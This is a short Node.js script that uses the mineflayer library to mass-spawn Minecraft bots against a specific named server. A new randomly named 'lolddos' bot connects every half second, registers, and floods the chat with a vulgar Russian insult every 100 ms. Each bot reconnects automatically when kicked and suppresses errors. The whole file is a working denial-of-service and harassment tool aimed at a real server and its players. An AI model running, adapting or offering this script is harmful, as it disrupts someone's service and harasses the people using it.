const mineflayer = require('mineflayer');

function createBot() {
    const username = `lolddos_${Math.floor(Math.random() * 1000000)}`;
    
    const bot = mineflayer.createBot({
        host: 'shinasmp.aternos.me',
        port: 11048,
        username: username,
        version: '1.21.1',
        hideErrors: true
    });

    bot.once('spawn', () => {
        bot.chat('/register lol999111 lol999111');
        
        setTimeout(() => {
            setInterval(() => {
                bot.chat('распизделись оба, дудос вашей сраки от либари');
            }, 100); 
        }, 1000);
    });

    bot.on('error', () => {});
    
    bot.on('end', () => {
        setTimeout(createBot, 1500);
    });

    bot.on('kicked', () => {
        setTimeout(createBot, 1500);
    });
}

setInterval(createBot, 500);
